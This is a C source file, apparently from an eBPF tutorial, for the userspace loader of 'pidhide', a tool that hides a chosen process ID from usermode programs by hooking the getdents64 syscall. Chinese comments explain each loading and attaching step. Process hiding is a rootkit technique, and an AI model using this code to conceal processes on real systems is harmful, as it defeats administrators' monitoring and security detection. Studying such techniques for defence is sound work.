// SPDX-License-Identifier: BSD-3-Clause
#include <argp.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <unistd.h>
#include <signal.h>
#include <sys/resource.h>
#include <errno.h>
#include <fcntl.h>

#include "pidhide.skel.h"
#include "pidhide.h"

// Setup Argument stuff
static struct env
{
    int pid_to_hide;
    int target_ppid;
} env;

const char *argp_program_version = "pidhide 1.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
    "PID Hider\n"
    "\n"
    "Uses eBPF to hide a process from usermode processes\n"
    "By hooking the getdents64 syscall and unlinking the pid folder\n"
    "\n"
    "USAGE: ./pidhide -p 2222 [-t 1111]\n";

static const struct argp_option opts[] = {
    {"pid-to-hide", 'p', "PID-TO-HIDE", 0, "Process ID to hide. Defaults to this program"},
    {"target-ppid", 't', "TARGET-PPID", 0, "Optional Parent PID, will only affect its children."},
    {},
};

static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key)
    {
    case 'p':
        errno = 0;
        env.pid_to_hide = strtol(arg, NULL, 10);
        if (errno || env.pid_to_hide <= 0)
        {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0)
        {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

static volatile sig_atomic_t exiting;

void sig_int(int signo)
{
    exiting = 1;
}

/**
 * 设置信号处理函数，用于优雅地处理程序终止信号
 * 
 * @return true: 设置成功; false: 设置失败
 */
static bool setup_sig_handler()
{
    // 为SIGINT(中断信号，通常是Ctrl+C)和SIGTERM(终止信号)添加处理函数，实现优雅关闭
    
    // 1. 设置SIGINT信号处理函数
    // signal()函数设置指定信号的处理函数，返回之前设置的处理函数
    __sighandler_t sighandler = signal(SIGINT, sig_int);
    if (sighandler == SIG_ERR)  // SIG_ERR表示设置失败
    {
        fprintf(stderr, "can't set signal handler: %s\n", strerror(errno));
        return false;
    }
    
    // 2. 设置SIGTERM信号处理函数
    // 使用同一个处理函数sig_int处理两种终止信号
    sighandler = signal(SIGTERM, sig_int);
    if (sighandler == SIG_ERR)
    {
        fprintf(stderr, "can't set signal handler: %s\n", strerror(errno));
        return false;
    }
    
    return true;  // 信号处理函数设置成功
}

/**
 * libbpf库的日志输出回调函数
 * 
 * @param level: 日志级别（如LIBBPF_WARN, LIBBPF_INFO, LIBBPF_DEBUG）
 * @param format: 格式化字符串
 * @param args: 可变参数列表
 * @return 返回实际输出的字符数
 */
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
    // 将libbpf的内部日志输出到标准错误(stderr)
    // 这允许我们捕获和查看libbpf库的调试信息、警告和错误
    return vfprintf(stderr, format, args);
}

/**
 * 通用设置函数，初始化程序运行所需的环境
 * 
 * @return true: 设置成功; false: 设置失败
 */
static bool setup()
{
    // 1. 设置libbpf库的日志输出回调
    // 将libbpf库的内部日志重定向到我们自定义的函数，这样可以：
    // - 控制日志的输出方式（如输出到文件、控制台等）
    // - 过滤或格式化日志内容
    // - 便于调试和问题排查
    libbpf_set_print(libbpf_print_fn);

    // 2. 设置信号处理函数
    // 这确保了当用户按下Ctrl+C或系统发送终止信号时，程序能够：
    // - 清理资源（如BPF程序、映射等）
    // - 从内核卸载BPF程序
    // - 优雅退出而不是强制终止
    if (!setup_sig_handler())
    {
        return false;  // 信号处理设置失败
    }

    return true;  // 所有设置完成
}

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Hid PID from program %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to hide PID from program %d (%s)\n", e->pid, e->comm);
    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;    // 环形缓冲区指针，用于从内核向用户空间传递事件
    struct pidhide_bpf *skel;         // BPF骨架结构，管理整个BPF程序
    int err;

    // 1. 解析命令行参数
    // 使用argp库解析参数，结果存储在全局env变量中
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err)
    {
        return err;  // 参数解析失败，返回错误码
    }
    
    // 2. 检查是否指定了要隐藏的PID
    if (env.pid_to_hide == 0)  // env.pid_to_hide为0表示未指定PID
    {
        printf("Pid Required, see %s --help\n", argv[0]);
        exit(1);
    }

    // 3. 执行通用设置（如设置权限、检查环境等）
    if (!setup())
    {
        exit(1);  // 设置失败，退出程序
    }

    // 4. 打开BPF应用程序
    // pidhide_bpf__open()根据编译的BPF对象文件创建骨架结构
    skel = pidhide_bpf__open();
    if (!skel)
    {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // 5. 设置要隐藏的PID
    char pid_to_hide[10];
    // 注意：这里有逻辑错误！前面的检查已经确保env.pid_to_hide!=0，所以这个if永远不会执行
    // 应该是冗余代码，可能原本设计为允许不指定PID时默认隐藏当前进程
    if (env.pid_to_hide == 0)
    {
        env.pid_to_hide = getpid();  // 获取当前进程PID作为默认值
    }
    
    // 将PID转换为字符串并复制到BPF程序的只读数据区
    sprintf(pid_to_hide, "%d", env.pid_to_hide);
    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
    skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;  // 包含终止符的长度
    
    // 设置目标父进程ID（如果指定了要隐藏特定父进程下的进程）
    skel->rodata->target_ppid = env.target_ppid;

    // 6. 验证并加载BPF程序到内核
    // 此步骤会进行BPF程序的验证、重定位、加载到内核等操作
    err = pidhide_bpf__load(skel);
    if (err)
    {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;  // 加载失败，跳转到清理代码
    }

    // 7. 禁用patch程序的自动附加
    // handle_getdents_patch程序只能通过尾调用执行，所以禁用自动附加机制
    bpf_program__set_autoattach(skel->progs.handle_getdents_patch, false);

    // 8. 设置尾调用映射（程序数组映射）
    // 尾调用允许一个BPF程序调用另一个BPF程序，类似于函数调用但开销更小
    
    // 添加第一个程序（handle_getdents_exit）到程序数组
    int index = PROG_01;  // 索引0，对应尾调用的第一个程序
    int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);  // 获取BPF程序的文件描述符
    int ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),  // 程序数组映射的文件描述符
        &index,                                   // 键：数组索引
        &prog_fd,                                 // 值：BPF程序文件描述符
        BPF_ANY);                                 // 标志：更新或创建
    if (ret == -1)
    {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }
    
    // 添加第二个程序（handle_getdents_patch）到程序数组
    index = PROG_02;  // 索引1
    prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
    ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (ret == -1)
    {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }

    // 9. 附加BPF程序到内核跟踪点
    // 这会将BPF程序附加到实际的系统调用跟踪点，使其开始执行
    err = pidhide_bpf__attach(skel);
    if (err)
    {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    // 10. 设置环形缓冲区用于从内核接收事件
    // 环形缓冲区是高效的内核-用户空间通信机制
    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb),  // 环形缓冲区映射的文件描述符
                          handle_event,                // 事件处理回调函数
                          NULL,                        // 回调函数的上下文参数
                          NULL);                       // 选项
    if (!rb)
    {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    // 11. 程序主循环
    printf("Successfully started!\n");
    printf("Hiding PID %d\n", env.pid_to_hide);
    
    while (!exiting)  // exiting是全局标志，当接收到信号时会被设置为true
    {
        // 轮询环形缓冲区，等待事件（超时100毫秒）
        err = ring_buffer__poll(rb, 100);
        
        /* Ctrl-C会触发-EINTR错误 */
        if (err == -EINTR)  // 中断信号（如Ctrl-C）
        {
            err = 0;
            break;  // 优雅退出循环
        }
        if (err < 0)  // 其他错误
        {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
        // 成功时，事件会通过handle_event回调函数处理
    }

// 12. 清理资源
cleanup:
    pidhide_bpf__destroy(skel);  // 销毁BPF骨架，释放所有资源（包括从内核卸载BPF程序）
    return -err;  // 返回错误码（取负值，遵循Linux错误处理惯例）
}
